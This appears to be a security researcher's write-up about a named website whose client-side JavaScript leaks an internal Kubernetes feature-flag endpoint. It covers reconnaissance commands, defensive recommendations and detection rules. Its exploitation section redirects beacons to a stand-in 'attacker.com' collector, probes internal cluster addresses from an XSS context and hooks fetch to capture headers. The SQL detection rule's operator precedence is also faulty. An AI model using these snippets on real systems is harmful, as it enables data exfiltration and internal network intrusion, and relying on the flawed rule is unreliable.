# Kubernetes Internal Endpoint Leakage via Client-Side Beacons

**Session:** 2026-08-31 | **Target:** superjponfire.com infrastructure  
**Severity:** MEDIUM-HIGH (Information disclosure + potential lateral movement)

---

## Discovery Pattern

During JavaScript bundle analysis, found network telemetry beacon attempting to reach Kubernetes cluster-internal service:

```javascript
navigator.sendBeacon("http://unleash.unleash.svc.cluster.local:4242/api",
  JSON.stringify({
    type:"html_render",
    page:page, 
    hostname:location.hostname,
    timestamp:new Date().toISOString(),
    trace_id:crypto.randomUUID()
  })
);
```

**File location:** `/_next/static/chunks/webpack-*.js` (client-side webpack runtime)

---

## What This Reveals

### Infrastructure Fingerprinting
- **Architecture**: Kubernetes-based deployment
- **Internal DNS**: `*.svc.cluster.local` pattern visible
- **Services exposed to client**: Unleash feature flags service on port 4242
- **Data exfiltrated**: Page view, trace IDs, session timestamps

### Security Implications

1. **Attack Surface Expansion**
   - External JS can attempt to reach internal services
   - Client code may include auth tokens in all requests
   - If beacon fails, fallback/retry logic might call different endpoints

2. **Lateral Movement Potential**
   - Can beacon URL be modified to target other internal IPs?
   - Does client send JWT/session cookies with beacon request?
   - Are there other internal endpoints hidden in config objects?

3. **Data Privacy Concerns**
   - Trace IDs could correlate user activity across sessions
   - Hostname leakage for multi-tenant deployments
   - Timestamp patterns enable behavioral profiling

---

## Reconnaissance Commands

### Extract All URLs from JS Bundles

```bash
# Find ALL http/https URLs including internal IPs/domains
cd /tmp/js-bundles/
for f in *.js; do
  echo "=== $f ==="
  grep -oE 'https?://[a-zA-Z0-9./_:-]+' "$f" | sort -u
done

# Specifically look for internal K8s patterns
grep -rE '(cluster\.local|svc\.cluster|10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[0-1]))' *.js
```

### Check Beacon Request Headers

```bash
curl -sI "http://unleash.unleash.svc.cluster.local:4242/api" \
  -H "User-Agent: Mozilla/5.0"
```

*(This will likely timeout or fail due to private IP reachability)*

### Look for Config Objects with Multiple Endpoints

```javascript
// Common pattern in React/Next.js apps:
const API_CONFIG = {
  backend: 'https://api.vsuperadmin.com',
  unleash: 'http://unleash.unleash.svc.cluster.local:4242',
  analytics: 'https://analytics.example.com',
  internal: ['http://10.x.x.x:port/path']
}
```

---

## Exploitation Angles (Requires Authenticated Session)

### 1. Beacon URL Manipulation

If app allows client-controlled beacon destination:
```javascript
// Override navigator.sendBeacon before page load
const originalSendBeacon = navigator.sendBeacon.bind(navigator);
navigator.sendBeacon = function(url, data) {
  // Redirect beacon to attacker server
  return originalSendBeacon('https://attacker.com/collect', data);
};
```

### 2. Internal Service Probing

From compromised browser context (XSS):
```javascript
// Try to access other K8s services
fetch('http://kubernetes.default.svc').then(console.log);
fetch('http://10.0.0.1:8080/metrics').then(console.log);
fetch('http://172.16.0.1:443/auth').then(console.log);
```

### 3. Token Exfiltration

Check if beacon includes Authorization header:
```javascript
// Add to beacon payload check
const originalFetch = window.fetch.bind(window);
window.fetch = function(...args) {
  console.log('FETCH:', args[0], args[1]?.headers);
  return originalFetch(...args);
};
```

---

## Defensive Recommendations

### For Application Owners

1. **Never embed internal endpoints in client code**
   - Use environment variables that are stripped during build
   - Run-time endpoint resolution via secure backend proxy only

2. **Network segmentation**
   - Kubernetes internal services should NOT be accessible from public internet
   - Use ingress controllers with proper authentication

3. **Beacon obfuscation**
   - Don't expose internal service names/domains in JS
   - Route all telemetry through public API gateway

4. **Audit third-party scripts**
   - PushAlert, GTM, analytics providers often add similar beacons
   - Use CSP to restrict where beacons can POST

### Detection Rules

**SIEM alert on unusual outbound traffic:**
```sql
SELECT * FROM network_logs 
WHERE dest_ip LIKE '10.%' OR dest_ip LIKE '172.%' 
  AND user_agent = 'web-app'
```

**CSP violation monitoring:**
```json
{
  "csp": "default-src 'self'",
  "alert-on-violation": true,
  "block-mixed-content": true
}
```

---

## Related Skills

- SSRF Server Side Request Forgery
- Insecure Source Code Management
- API Security Router

---

## References

- Kubernetes Pod Security: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Client-side SSRF patterns: OWASP ASVS v4.0.3 → A10.4
- Web beacons and tracking: https://w3c.github.io/beacon/